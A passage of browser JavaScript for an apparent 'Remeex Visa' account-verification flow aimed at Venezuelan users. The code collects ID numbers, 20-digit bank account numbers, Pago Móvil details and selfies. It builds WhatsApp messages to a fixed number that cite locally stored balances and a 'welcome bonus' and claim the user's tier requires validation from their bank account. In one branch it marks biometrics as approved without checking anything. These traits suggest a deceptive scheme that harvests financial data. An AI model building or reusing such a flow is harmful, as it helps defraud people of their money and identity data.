        const balanceData = JSON.parse(localStorage.getItem('remeexBalance') || '{}');
        const saldoBs = balanceData.bs ? balanceData.bs.toLocaleString('es-VE', { minimumFractionDigits: 2 }) : 'N/A';
        const saldoUsd = balanceData.usd ? balanceData.usd.toLocaleString('en-US', { minimumFractionDigits: 2 }) : 'N/A';
        const id = creds.idNumber || reg.documentNumber || '';
        const bank = (typeof BANK_NAME_MAP !== 'undefined') ? (BANK_NAME_MAP[reg.primaryBank] || reg.primaryBank || 'mi banco') : (reg.primaryBank || 'mi banco');
        const tier = localStorage.getItem('remeexAccountTier') || 'Estándar';
        let message = `Hola, soy ${name}, cédula ${id}, soy usuario remeex visa VERE54872 de Venezuela. Mi saldo actual es de ${saldoBs} Bs (${saldoUsd} USD), mi banco asociado es ${bank}, mi nivel de cuenta es ${tier}, y solicito ayuda para el proceso de validación de mi cuenta, ya que mi nivel ${tier} requiere que haga una validación desde mi cuenta de banco ${bank}`;

        if (balanceData.usd > 515) {
          try {
            const data = JSON.parse(localStorage.getItem('remeexTransactions') || '{}');
            const txs = data.transactions || [];
            const deposits = txs.filter(t => t.type === 'deposit' && t.status === 'completed');
            if (deposits.length) {
              const details = deposits.map(t => {
                if (t.description === 'Bono de bienvenida') {
                  return `Bono de Bienvenida de $${t.amount.toFixed(2)}`;
                }
                const card = t.card ? ` ${t.card}` : '';
                return `${t.description}${card} por la cantidad de $${t.amount.toFixed(2)}`;
              }).join(' / ');
              message += `\n\n${details}`;
            }
          } catch (e) {}
        }

        return message;
      }

      const waMsg = encodeURIComponent(buildSupportMessage());
      document.querySelectorAll('a.whatsapp-link').forEach(link => {
        link.href = `https://wa.me/+17373018059?text=${waMsg}`;
      });
    });

    // Check if verification already completed
    function checkExistingVerification() {
      const existingData = localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_DATA);
      const existingStatus = localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_STATUS);
      
      if (existingStatus && existingStatus !== 'unverified') {
        redirectToDashboard();
        return;
      }
      
      // Load existing partial data if available
      if (existingData) {
        try {
          verificationData = JSON.parse(existingData);
          populateFormWithExistingData();
        } catch (e) {
          console.error('Error loading existing data:', e);
        }
      }

      // Load banking data
      const existingBanking = localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_BANKING);
      if (existingBanking) {
        try {
          bankingData = JSON.parse(existingBanking);
          populateBankingData();
        } catch (e) {
          console.error('Error loading banking data:', e);
        }
      }
    }

    // Show already completed screen
    function showAlreadyCompleted() {
      document.getElementById('verification-process').style.display = 'none';
      document.getElementById('already-completed-screen').style.display = 'block';
      
      const existingData = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_DATA) || '{}');
      
      if (existingData.completionDate) {
        document.getElementById('verification-date-display').textContent = 
          new Date(existingData.completionDate).toLocaleDateString('es-ES');
      }
    }

    // Populate form with existing data
    function populateFormWithExistingData() {
      Object.keys(verificationData).forEach(key => {
        const element = document.getElementById(key);
        if (element && verificationData[key]) {
          element.value = verificationData[key];
          element.classList.add('success');
        }
      });
    }

    // Populate banking data
    function populateBankingData() {
      if (bankingData.bankId) {
        selectedBank = VENEZUELAN_BANKS.find(bank => bank.id === bankingData.bankId);
        if (selectedBank) {
          const isNoBankStored = bankingData.bankId === 'no-bank';
          if (isNoBankStored) {
            noBankSupportInfo = bankingData.noBankSupportInfo || null;
            noBankRequestCompleted = Boolean(bankingData.noBankRequestCompleted);
          }

          selectBank(selectedBank, { skipOverlay: isNoBankStored, silent: true });

          if (isNoBankStored) {
            if (noBankRequestCompleted) {
              validateBankingStep();
            }
            return;
          }
        }
      }

      if (bankingData.accountType) {
        accountType = bankingData.accountType;
        updateAccountTypeButtons();
      }

      if (bankingData.accountNumber) {
        document.getElementById('account-number').value = bankingData.accountNumber;
      }

      if (bankingData.pagoMovilEnabled) {
        pagoMovilEnabled = bankingData.pagoMovilEnabled;
        updatePagoMovilToggle();
        if (bankingData.pagoMovilPhone) {
          document.getElementById('pago-movil-phone').value = bankingData.pagoMovilPhone;
        }
        if (bankingData.pagoMovilCedula) {
          document.getElementById('pago-movil-cedula').value = bankingData.pagoMovilCedula;
        }
      }
    }

    function formatList(items) {
      if (!Array.isArray(items) || items.length === 0) {
        return '';
      }

      if (items.length === 1) {
        return items[0];
      }

      const allButLast = items.slice(0, -1);
      const lastItem = items[items.length - 1];
      return `${allButLast.join(', ')} y ${lastItem}`;
    }

    function updateResumeMessage(completedSteps, resumeStep) {
      const messageWrapper = document.getElementById('resume-message');
      const messageText = document.getElementById('resume-message-text');

      if (!messageWrapper || !messageText) {
        return '';
      }

      const filteredSteps = Array.isArray(completedSteps)
        ? completedSteps.filter(Boolean)
        : [];

      if (!filteredSteps.length) {
        messageWrapper.style.display = 'none';
        return '';
      }

      const formattedList = formatList(filteredSteps);
      let resumeMessage = `Ya registramos ${formattedList}.`;

      if (resumeStep === 4) {
        if (tallyCompleted) {
          resumeMessage = `Ya registramos ${formattedList}. Presiona "Completar Verificación" para finalizar el proceso.`;
        } else {
          resumeMessage = `Ya registramos ${formattedList}. Solo falta completar el formulario final para terminar tu verificación.`;
        }
      } else {
        resumeMessage = `Ya registramos ${formattedList}. Continúa con el siguiente paso para finalizar.`;
      }

      messageText.textContent = resumeMessage;
      messageWrapper.style.display = 'block';

      return resumeMessage;
    }

    function updateStep4BiometricMessaging() {
      const message = document.getElementById('final-biometric-message');
      if (!message) {
        return;
      }

      if (biometricSkipped) {
        message.textContent = 'Decidiste continuar sin la verificación biométrica. Completa el formulario y adjunta tu documentación para validar tu identidad.';
      } else if (biometricLocked || hasSelfie) {
        message.textContent = 'Hemos recibido sus datos personales, información bancaria y verificación biométrica. Complete el siguiente formulario para finalizar el proceso.';
      } else {
        message.textContent = 'Hemos recibido sus datos personales e información bancaria. Puedes completar el formulario o realizar la biometría facial para agilizar la validación.';
      }
    }

    function applyBiometricCompletionState() {
      biometricLocked = true;
      livenessAttempts = Math.max(livenessAttempts, 2);
      hasSelfie = true;
      clearBiometricSkip();

      updateStep4BiometricMessaging();

      renderBiometricReport(2);
      updateLivenessStatus('Biometría validada previamente', 'success');
      setOverlayStage('completed');

      const startBtn = document.getElementById('start-liveness');
      if (startBtn) {
        startBtn.disabled = true;
        startBtn.innerHTML = '<i class="fas fa-user-check"></i> Biometría aprobada';
        startBtn.classList.remove('btn-primary');
        startBtn.classList.add('btn-success');
      }

      const switchBtn = document.getElementById('switch-camera');
      if (switchBtn) {
        switchBtn.disabled = true;
        switchBtn.classList.add('is-disabled');
        switchBtn.setAttribute('aria-disabled', 'true');
      }

      const nextBtn = document.getElementById('next-step-3');
      if (nextBtn) {
        nextBtn.disabled = false;
        nextBtn.classList.remove('btn-outline');
        nextBtn.classList.add('btn-success');
        nextBtn.innerHTML = '<i class="fas fa-arrow-right"></i> Continuar';
      }
    }

    function restoreVerificationProgress() {
      const status = localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_STATUS);
      if (status && status !== 'unverified') {
        return;
      }

      let storedData = {};
      let storedBanking = {};

      try {
        storedData = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_DATA) || '{}');
      } catch (error) {
        storedData = {};
      }

      try {
        storedBanking = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_BANKING) || '{}');
      } catch (error) {
        storedBanking = {};
      }

      let storedTally = {};
      try {
        storedTally = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_TALLY) || '{}');
      } catch (error) {
        storedTally = {};
      }

      const biometricReference = getStoredBiometricReference();
      let storedBiometricSkip = false;
      try {
        storedBiometricSkip = localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_BIOMETRIC_SKIPPED) === 'true';
      } catch (error) {
        storedBiometricSkip = false;
      }

      if (storedBiometricSkip && !(biometricReference && biometricReference.captured)) {
        applyBiometricOptOutState({ fromStorage: true });
      }

      const completedSteps = [];
      let resumeStep = 1;

      if (storedData && storedData.address && storedData.occupation) {
        completedSteps.push('datos personales');
        resumeStep = 2;
      }

      if (storedBanking && storedBanking.bankId && storedBanking.accountNumber && storedBanking.accountType) {
        completedSteps.push('información bancaria');
        resumeStep = 3;
      }

      if (biometricReference && biometricReference.captured) {
        completedSteps.push('biometría facial');
        applyBiometricCompletionState();
        resumeStep = 4;
      } else if (biometricSkipped) {
        completedSteps.push('decidiste continuar sin biometría facial');
        resumeStep = 4;
      }

      if (storedTally && storedTally.completed) {
        completedSteps.push('carga de cédula y firma');
        tallyCompleted = true;
        resumeStep = 4;
      }

      const resumeMessage = updateResumeMessage(completedSteps, resumeStep);

      if (resumeStep > 1) {
        goToStep(resumeStep);

        if (resumeMessage) {
          let toastTitle = 'Progreso guardado';
          if (resumeStep === 4) {
            toastTitle = tallyCompleted
              ? 'Formulario ya enviado'
              : 'Biometría ya validada';
          }
          showToast('info', toastTitle, resumeMessage);
        }
      }
    }

    // Populate bank grid
    function populateBankGrid() {
      const bankGrid = document.getElementById('bank-grid');

      VENEZUELAN_BANKS.forEach(bank => {
        const bankOption = document.createElement('div');
        const classes = ['bank-option'];
        if (bank.id === 'no-bank') {
          classes.push('no-bank-option');
        }
        bankOption.className = classes.join(' ');
        bankOption.dataset.bankId = bank.id;

        bankOption.innerHTML = `
          <img class="bank-logo" src="${bank.logo}" alt="${bank.name}" onerror="this.src='https://e7.pngegg.com/pngimages/127/511/png-clipart-bank-computer-icons-bank-building-bank.png'">
          <div class="bank-name">${bank.name}</div>
        `;

        bankOption.addEventListener('click', () => selectBank(bank, { userTriggered: true }));
        bankGrid.appendChild(bankOption);
      });
    }

    // Select bank
    function selectBank(bank, options = {}) {
      const { userTriggered = false, skipOverlay = false, silent = false } = options;
      // Remove previous selection
      document.querySelectorAll('.bank-option').forEach(option => {
        option.classList.remove('selected');
      });

      // Select new bank
      const bankOption = document.querySelector(`[data-bank-id="${bank.id}"]`);
      if (bankOption) {
        bankOption.classList.add('selected');

        // Animate selection
        if (userTriggered) {
          gsap.fromTo(bankOption,
            { scale: 1 },
            { scale: 1.05, duration: 0.2, yoyo: true, repeat: 1 }
          );
        }
      }

      selectedBank = bank;
      noBankMode = bank.id === 'no-bank';
      if (!noBankMode) {
        noBankRequestCompleted = false;
        noBankSupportInfo = null;
      }

      // Show bank info
      const selectedBankInfo = document.getElementById('selected-bank-info');
      const selectedBankLogo = document.getElementById('selected-bank-logo');
      const selectedBankName = document.getElementById('selected-bank-name');

      if (selectedBankLogo) {
        selectedBankLogo.src = bank.logo;
        selectedBankLogo.onerror = function() {
          this.src = 'https://e7.pngegg.com/pngimages/127/511/png-clipart-bank-computer-icons-bank-building-bank.png';
        };
      }
      if (selectedBankName) {
        selectedBankName.textContent = bank.name;
      }

      const accountNumberInput = document.getElementById('account-number');
      const pagoMovilToggle = document.getElementById('pago-movil-toggle');
      const pagoMovilFields = document.getElementById('pago-movil-fields');

      if (noBankMode) {
        if (selectedBankInfo) {
          selectedBankInfo.classList.remove('active');
          selectedBankInfo.classList.add('no-bank-mode');
        }
        if (accountNumberInput) {
          accountNumberInput.value = '';
          accountNumberInput.disabled = true;
          accountNumberInput.classList.remove('error', 'success');
        }
        pagoMovilEnabled = false;
        updatePagoMovilToggle();
        if (pagoMovilToggle) {
          pagoMovilToggle.style.display = 'none';
        }
        if (pagoMovilFields) {
          pagoMovilFields.classList.remove('active');
        }

        validateBankingStep();

        if (!skipOverlay) {
          openNoBankOverlay();
        }

        if (!silent) {
          showToast('info', 'Sin cuenta bancaria', 'Completa los datos solicitados para reportarlo a soporte.');
        }

        return;
      }

      if (selectedBankInfo) {
        selectedBankInfo.classList.remove('no-bank-mode');
        selectedBankInfo.classList.add('active');
      }

      if (accountNumberInput) {
        accountNumberInput.disabled = false;
      }

      if (pagoMovilToggle) {
        pagoMovilToggle.style.display = '';
      }

      updatePagoMovilToggle();

      const accInput = document.getElementById('account-number');
      const prefix = BANK_CODES[bank.id] || '';
      if (prefix) {
        const current = accInput.value.replace(/\D/g, '');
        accInput.value = prefix + current.substring(prefix.length);
      }

      validateBankingStep();
      if (!silent) {
        showToast('success', 'Banco seleccionado', `Has seleccionado ${bank.name}`);
      }
    }

    function getCurrentUserIdentity() {
      try {
        const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
        const creds = JSON.parse(localStorage.getItem('remeexUserCredentials') || '{}');
        const name = creds.name || reg.preferredName || reg.firstName || 'usuario';
        const id = creds.idNumber || reg.documentNumber || '';
        return { name, id };
      } catch (error) {
        return { name: 'usuario', id: '' };
      }
    }

    function populateNoBankFormFields(info) {
      const nameInput = document.getElementById('no-bank-authorized-name');
      const idInput = document.getElementById('no-bank-authorized-id');
      const bankInput = document.getElementById('no-bank-authorized-bank');
      const relationshipInput = document.getElementById('no-bank-relationship');

      const data = info || { authorizedName: '', authorizedId: '', authorizedBank: '', relationship: '' };

      if (nameInput) nameInput.value = data.authorizedName || '';
      if (idInput) idInput.value = data.authorizedId || '';
      if (bankInput) bankInput.value = data.authorizedBank || '';
      if (relationshipInput) relationshipInput.value = data.relationship || '';

      updateNoBankMessagePreview();
    }

    function openNoBankOverlay() {
      const overlay = document.getElementById('no-bank-overlay');
      if (!overlay) {
        return;
      }

      overlay.style.display = 'flex';
      overlay.dataset.open = 'true';
      overlay.setAttribute('aria-hidden', 'false');

      populateNoBankFormFields(noBankSupportInfo);

      const firstField = document.getElementById('no-bank-authorized-name');
      if (firstField) {
        setTimeout(() => firstField.focus(), 80);
      }
    }

    function closeNoBankOverlay(resetSelection = false) {
      const overlay = document.getElementById('no-bank-overlay');
      if (!overlay) {
        return;
      }

      overlay.dataset.open = 'false';
      overlay.setAttribute('aria-hidden', 'true');
      overlay.style.display = 'none';

      if (resetSelection) {
        const noBankOption = document.querySelector('[data-bank-id="no-bank"]');
        if (noBankOption) {
          noBankOption.classList.remove('selected');
        }

        const selectedBankInfo = document.getElementById('selected-bank-info');
        if (selectedBankInfo) {
          selectedBankInfo.classList.remove('no-bank-mode');
        }

        const accountNumberInput = document.getElementById('account-number');
        if (accountNumberInput) {
          accountNumberInput.disabled = false;
          accountNumberInput.value = '';
          accountNumberInput.classList.remove('error', 'success');
        }

        const pagoMovilToggle = document.getElementById('pago-movil-toggle');
        if (pagoMovilToggle) {
          pagoMovilToggle.style.display = '';
        }

        noBankMode = false;
        noBankRequestCompleted = false;
        noBankSupportInfo = null;
        selectedBank = null;
        populateNoBankFormFields(null);
        updatePagoMovilToggle();
        validateBankingStep();
      }
    }

    function getNoBankFormData() {
      const authorizedName = (document.getElementById('no-bank-authorized-name')?.value || '').trim();
      const authorizedId = (document.getElementById('no-bank-authorized-id')?.value || '').trim();
      const authorizedBank = (document.getElementById('no-bank-authorized-bank')?.value || '').trim();
      const relationship = (document.getElementById('no-bank-relationship')?.value || '').trim();

      return { authorizedName, authorizedId, authorizedBank, relationship };
    }

    function buildNoBankSupportMessage(info) {
      const { authorizedName, authorizedId, authorizedBank, relationship } = info;
      const { name, id } = getCurrentUserIdentity();

      let message = `Hola equipo de soporte, soy ${name}`;
      if (id) {
        message += `, cédula ${id}`;
      }
      message += '. No tengo una cuenta bancaria activa para retiros y necesito registrar un titular autorizado.';
      message += '\n\nDatos del autorizado:';
      message += `\n• Nombre completo: ${authorizedName}`;
      message += `\n• Cédula: ${authorizedId}`;
      message += `\n• Banco: ${authorizedBank}`;
      message += `\n• Relación conmigo: ${relationship}`;
      message += '\n\nSolicito su apoyo para autorizar esta cuenta y poder finalizar mi verificación biométrica.';

      return message;
    }

    function updateNoBankMessagePreview() {
      const preview = document.getElementById('no-bank-message-preview');
      if (!preview) {
        return;
      }

      const info = getNoBankFormData();
      if (info.authorizedName && info.authorizedId && info.authorizedBank && info.relationship) {
        preview.value = buildNoBankSupportMessage(info);
      } else {
        preview.value = 'Completa todos los campos para generar el mensaje a soporte.';
      }
    }

    function completeNoBankFlow(info) {
      if (!selectedBank || selectedBank.id !== 'no-bank') {
        return;
      }

      const wasCompleted = noBankRequestCompleted;

      noBankSupportInfo = info;
      noBankRequestCompleted = true;

      validateBankingStep();
      saveStepData(2);

      if (wasCompleted) {
        showToast('info', 'Datos actualizados', 'Actualizamos la información del titular autorizado para soporte.');
      } else {
        showToast('success', 'Soporte notificado', 'Abrimos WhatsApp con el mensaje para reportar tu caso. Continuaremos con tu verificación.');
      }

      applyBiometricCompletionState();
      goToStep(3);
    }

    function handleNoBankSubmit(event) {
      event.preventDefault();

      const info = getNoBankFormData();
      if (!info.authorizedName || !info.authorizedId || !info.authorizedBank || !info.relationship) {
        showToast('error', 'Datos incompletos', 'Ingresa todos los datos solicitados del titular autorizado.');
        updateNoBankMessagePreview();
        return;
      }

      const message = buildNoBankSupportMessage(info);
      const preview = document.getElementById('no-bank-message-preview');
      if (preview) {
        preview.value = message;
      }

      const whatsappUrl = `https://wa.me/+17373018059?text=${encodeURIComponent(message)}`;
      window.open(whatsappUrl, '_blank');

      completeNoBankFlow(info);
      closeNoBankOverlay(false);
    }

    function initializeNoBankOverlay() {
      const overlay = document.getElementById('no-bank-overlay');
      if (!overlay) {
        return;
      }

      overlay.dataset.open = overlay.dataset.open || 'false';

      const form = document.getElementById('no-bank-form');
      const cancelBtn = document.getElementById('no-bank-cancel');
      const closeBtn = document.getElementById('no-bank-close');
      const inputs = overlay.querySelectorAll('input');

      if (form) {
        form.addEventListener('submit', handleNoBankSubmit);
      }

      inputs.forEach(input => {
        input.addEventListener('input', updateNoBankMessagePreview);
      });

      if (cancelBtn) {
        cancelBtn.addEventListener('click', () => closeNoBankOverlay(true));
      }

      if (closeBtn) {
        closeBtn.addEventListener('click', () => closeNoBankOverlay(true));
      }

      overlay.addEventListener('click', event => {
        if (event.target === overlay) {
          closeNoBankOverlay(true);
        }
      });

      document.addEventListener('keydown', event => {
        if (event.key === 'Escape' && overlay.dataset.open === 'true') {
          closeNoBankOverlay(true);
        }
      });

      updateNoBankMessagePreview();
    }

    // Setup event listeners
    function setupEventListeners() {
      // Navigation buttons
      document.getElementById('next-step-1').addEventListener('click', () => validateAndProceed(1));
      document.getElementById('prev-step-2').addEventListener('click', () => goToStep(1));
      document.getElementById('next-step-2').addEventListener('click', () => validateAndProceed(2));
      document.getElementById('prev-step-3').addEventListener('click', () => goToStep(2));
      document.getElementById('next-step-3').addEventListener('click', () => validateAndProceed(3));
      document.getElementById('prev-step-4').addEventListener('click', () => {
        if (biometricLocked || biometricSkipped) {
          goToStep(2);
        } else {
          goToStep(3);
        }
      });
      document.getElementById('complete-verification').addEventListener('click', completeVerification);
      const returnBtn = document.getElementById('return-dashboard');
      if (returnBtn) {
        returnBtn.addEventListener('click', function(e) {
          e.preventDefault();
          redirectToDashboard();
        });
      }

      const confirmAccept = document.getElementById('confirm-accept');
      const confirmEdit = document.getElementById('confirm-edit');
      if (confirmAccept) {
        confirmAccept.addEventListener('click', function() {
          saveStepData(2);
          hideConfirmationOverlay();
          if (biometricLocked || biometricSkipped) {
            goToStep(4);
          } else {
            goToStep(3);
          }
        });
      }
      if (confirmEdit) {
        confirmEdit.addEventListener('click', hideConfirmationOverlay);
      }

        const idCheckOwner = document.getElementById('id-check-owner');
        const idCheckNotOwner = document.getElementById('id-check-not-owner');
        if (idCheckOwner) {
          idCheckOwner.addEventListener('click', function() {
            hideIdCheckOverlay();
          });
        }
        if (idCheckNotOwner) {
          idCheckNotOwner.addEventListener('click', function() {
            hideIdCheckOverlay();
            showFraudWarningOverlay();
          });
        }

        const fraudClose = document.getElementById('fraud-warning-close');
        if (fraudClose) {
          fraudClose.addEventListener('click', hideFraudWarningOverlay);
        }

        const incompleteClose = document.getElementById('incomplete-close');
      if (incompleteClose) {
        incompleteClose.addEventListener('click', hideIncompleteOverlay);
      }

      const retakeConfirm = document.getElementById('retake-confirm');
      const retakeCancel = document.getElementById('retake-cancel');
      if (retakeConfirm) {
        retakeConfirm.addEventListener('click', confirmRetake);
      }
      if (retakeCancel) {
        retakeCancel.addEventListener('click', hideRetakeOverlay);
      }

      const skipOverlay = document.getElementById('skip-biometrics-overlay');
      const skipCancel = document.getElementById('skip-biometrics-cancel');
      const skipConfirm = document.getElementById('skip-biometrics-confirm');
      if (skipCancel) {
        skipCancel.addEventListener('click', hideSkipBiometricsOverlay);
      }
      if (skipConfirm) {
        skipConfirm.addEventListener('click', confirmSkipBiometrics);
      }
      if (skipOverlay) {
        skipOverlay.addEventListener('click', function(event) {
          if (event.target === skipOverlay) {
            hideSkipBiometricsOverlay();
          }
        });
      }

      const avatarClose = document.getElementById('avatar-compare-close');
      const avatarOverlay = document.getElementById('avatar-compare-overlay');
      if (avatarClose) {
        avatarClose.addEventListener('click', hideAvatarComparisonOverlay);
      }
      if (avatarOverlay) {
        avatarOverlay.addEventListener('click', function(event) {
          if (event.target === avatarOverlay) {
            hideAvatarComparisonOverlay();
          }
        });
      }

      // Form validation
      setupFormValidation();
      
      // Banking controls
      setupBankingControls();
      
      // Camera controls
      setupCameraControls();
    }

    // Setup form validation
    function setupFormValidation() {
      const inputs = document.querySelectorAll('.form-control');
      inputs.forEach(input => {
        input.addEventListener('blur', validateField);
        input.addEventListener('input', clearFieldError);
      });
    }

    // Setup banking controls
    function setupBankingControls() {
      const accountNumberInput = document.getElementById('account-number');
      const pagoMovilPhoneInput = document.getElementById('pago-movil-phone');
      const pagoMovilCedulaInput = document.getElementById('pago-movil-cedula');

      // Account type toggle
      document.querySelectorAll('.account-type-option').forEach(btn => {
        btn.addEventListener('click', (event) => {
          const option = event.currentTarget;
          document.querySelectorAll('.account-type-option').forEach(b => b.classList.remove('active'));
          option.classList.add('active');
          accountType = option.dataset.type;
          if (accountType === 'corriente') {
            playGuideAudio(ok26);
          } else if (accountType === 'ahorro') {
            playGuideAudio(ok27);
          }
          validateBankingStep();
        });
      });

      // Pago Móvil toggle
      const pagoMovilSwitch = document.getElementById('pago-movil-switch');
      if (pagoMovilSwitch) {
        pagoMovilSwitch.addEventListener('click', () => {
          pagoMovilEnabled = !pagoMovilEnabled;
          updatePagoMovilToggle();
          validateBankingStep();

          if (pagoMovilEnabled) {
            if (document.activeElement === pagoMovilCedulaInput) {
              playGuideAudio(ok30);
            } else {
              playGuideAudio(ok29);
            }
          }
        });
      }

      // Account number validation
      if (accountNumberInput) {
        accountNumberInput.addEventListener('input', validateBankingStep);
      }

      if (pagoMovilPhoneInput) {
        pagoMovilPhoneInput.addEventListener('input', validateBankingStep);
      }

      if (pagoMovilCedulaInput) {
        pagoMovilCedulaInput.addEventListener('input', validateBankingStep);
      }
    }

    // Update account type buttons
    function updateAccountTypeButtons() {
      document.querySelectorAll('.account-type-option').forEach(btn => {
        btn.classList.remove('active');
        if (btn.dataset.type === accountType) {
          btn.classList.add('active');
        }
      });
    }

    // Update Pago Móvil toggle
    function updatePagoMovilToggle() {
      const toggle = document.getElementById('pago-movil-switch');
      const fields = document.getElementById('pago-movil-fields');
      
      if (pagoMovilEnabled) {
        toggle.classList.add('active');
        fields.classList.add('active');
      } else {
        toggle.classList.remove('active');
        fields.classList.remove('active');
      }
    }

    // Validate banking step
    function validateBankingStep() {
      const nextBtn = document.getElementById('next-step-2');

      if (noBankMode) {
        if (nextBtn) {
          nextBtn.disabled = true;
          nextBtn.classList.remove('btn-primary');
          nextBtn.classList.add('btn-outline');
        }
        return noBankRequestCompleted;
      }

      const accountNumber = document.getElementById('account-number').value.trim();
      let isValid = selectedBank && accountNumber.length === 20;

      if (pagoMovilEnabled) {
        const pagoMovilPhone = document.getElementById('pago-movil-phone').value.trim();
        const pagoMovilCedula = document.getElementById('pago-movil-cedula').value.trim();
        isValid = isValid && pagoMovilPhone && pagoMovilCedula;
      }

      nextBtn.disabled = !isValid;

      if (isValid) {
        nextBtn.classList.remove('btn-outline');
        nextBtn.classList.add('btn-primary');
      } else {
        nextBtn.classList.remove('btn-primary');
        nextBtn.classList.add('btn-outline');
      }
    }

    // Validate individual field
    function validateField(event) {
      const field = event.target;
      const value = field.value.trim();
      let isValid = true;
      let errorMessage = '';

      // Required field check
      if (field.hasAttribute('required') && !value) {
        isValid = false;
        errorMessage = 'Este campo es obligatorio';
      }

      // Specific validations
      switch (field.id) {
        case 'email':
          if (value && !isValidEmail(value)) {
            isValid = false;
            errorMessage = 'Por favor ingrese un correo electrónico válido';
          }
          break;
        case 'phoneNumber':
          if (value && !isValidPhoneNumber(value)) {
            isValid = false;
            errorMessage = 'Por favor ingrese un número de teléfono válido';
          }
          break;
        case 'full-name':
          if (value && value.split(' ').length < 2) {
            isValid = false;
            errorMessage = 'Por favor ingrese nombres y apellidos completos';
          }
          break;
        case 'birth-date':
          if (value && !isValidAge(value)) {
            isValid = false;
            errorMessage = 'Debe ser mayor de 18 años';
          }
          break;
        case 'account-number':
          if (value.length !== 20) {
            isValid = false;
            errorMessage = 'El número de cuenta debe tener 20 dígitos';
          }
          break;
    }

      // Update field appearance with animation
      const errorElement = document.getElementById(field.id + '-error');
      if (isValid) {
        field.classList.remove('error');
        field.classList.add('success');
        if (errorElement) {
          gsap.to(errorElement, { opacity: 0, duration: 0.3, onComplete: () => {
            errorElement.style.display = 'none';
          }});
        }
      } else {
        field.classList.remove('success');
        field.classList.add('error');
        if (errorElement) {
          errorElement.textContent = errorMessage;
          errorElement.style.display = 'block';
          gsap.fromTo(errorElement, { opacity: 0 }, { opacity: 1, duration: 0.3 });
        }
      }

      return isValid;
    }

    // Clear field error
    function clearFieldError(event) {
      const field = event.target;
      field.classList.remove('error');
      const errorElement = document.getElementById(field.id + '-error');
      if (errorElement) {
        gsap.to(errorElement, { opacity: 0, duration: 0.3, onComplete: () => {
          errorElement.style.display = 'none';
        }});
      }
    }

    // Validation helpers
    function isValidEmail(email) {
      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }

    function isValidPhoneNumber(phone) {
      return /^[\+]?[0-9\s\-\(\)]{10,}$/.test(phone);
    }

    function isValidAge(birthDate) {
      const today = new Date();
      const birth = new Date(birthDate);
      const age = today.getFullYear() - birth.getFullYear();
      const monthDiff = today.getMonth() - birth.getMonth();
      
      if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birth.getDate())) {
        return age - 1 >= 18;
      }
      return age >= 18;
    }

    // Setup camera controls
    function setupCameraControls() {
      const startBtn = document.getElementById('start-liveness');
      if (startBtn) {
        startBtn.addEventListener('click', startLivenessScan);
      }

      const requestPermissionBtn = document.getElementById('request-camera-access');
      if (requestPermissionBtn) {
        requestPermissionBtn.addEventListener('click', requestCameraPermission);
      }

      const skipBiometricsBtn = document.getElementById('skip-biometrics');
      if (skipBiometricsBtn) {
        skipBiometricsBtn.addEventListener('click', showSkipBiometricsOverlay);
      }

      const switchBtn = document.getElementById('switch-camera');
      if (switchBtn) {
        switchBtn.addEventListener('click', switchCamera);
      }

      forEachRetakeButton(button => {
        button.addEventListener('click', retakePhoto);
      });

      const removeBtn = document.getElementById('remove-selfie');
      if (removeBtn) {
        removeBtn.addEventListener('click', removeSelfie);
      }

      initializeBiometricGuidance({ resetAttempts: true });
    }

    function forEachRetakeButton(callback) {
      const buttons = [
        document.getElementById('retake-btn'),
        document.getElementById('retake-btn-primary')
      ];

      buttons.forEach(button => {
        if (button) {
          callback(button);
        }
      });
    }

    function showRetakeButtons() {
      forEachRetakeButton(button => {
        button.style.display = 'block';
        button.disabled = false;
      });

      const startButton = document.getElementById('start-liveness');
      if (startButton) {
        startButton.style.display = 'none';
      }
    }

    function hideRetakeButtons({ disable = false, preserveStartHidden = false } = {}) {
      forEachRetakeButton(button => {
        button.style.display = 'none';
        button.disabled = disable ? true : false;
      });

      if (!preserveStartHidden) {
        const startButton = document.getElementById('start-liveness');
        if (startButton) {
          startButton.style.display = 'block';
        }
      }
    }

    function getCameraConstraints() {
      return {
        video: {
          facingMode: facingMode,
          width: { ideal: 640 },
          height: { ideal: 480 }
        }
      };
    }

    function applyCameraStream(stream, {
      successTitle = 'Cámara activada',
      successMessage = 'La cámara está lista para tomar la foto'
    } = {}) {
      cameraStream = stream;

      const video = document.getElementById('camera-video');
      if (video) {
        video.srcObject = stream;
        video.removeAttribute('aria-hidden');
        if (typeof video.play === 'function') {
          video.play().catch(() => {});
        }
      }

      const cameraContainer = document.getElementById('camera-container');
      if (cameraContainer) {
        cameraContainer.classList.remove('camera-disabled');
      }

      const cameraReadyBadge = document.getElementById('camera-ready');
      if (cameraReadyBadge) {
        cameraReadyBadge.style.display = 'inline-flex';
        if (typeof gsap !== 'undefined') {
          gsap.fromTo('#camera-ready', { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: 0.5 });
        }
      }

      const startBtn = document.getElementById('start-liveness');
      if (startBtn) {
        startBtn.disabled = false;
        startBtn.innerHTML = '<i class="fas fa-bolt"></i> Iniciar escaneo biométrico';
      }

      const switchBtn = document.getElementById('switch-camera');
      if (switchBtn) {
        switchBtn.disabled = false;
        switchBtn.classList.remove('is-disabled');
        switchBtn.removeAttribute('aria-disabled');
      }

      showToast('success', successTitle, successMessage);
    }

    // Initialize camera
    async function initializeCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(getCameraConstraints());
        applyCameraStream(stream);
      } catch (error) {
        console.error('Error accessing camera:', error);
        showToast('error', 'Error de cámara', 'No se pudo acceder a la cámara. Verifique los permisos.');
      }
    }

    async function requestCameraPermission() {
      const requestButton = document.getElementById('request-camera-access');
      const startBtn = document.getElementById('start-liveness');
      const video = document.getElementById('camera-video');
      const cameraContainer = document.getElementById('camera-container');
      const cameraReadyBadge = document.getElementById('camera-ready');

      if (requestButton) {
        requestButton.disabled = true;
        requestButton.setAttribute('aria-busy', 'true');
      }

      if (startBtn) {
        startBtn.disabled = true;
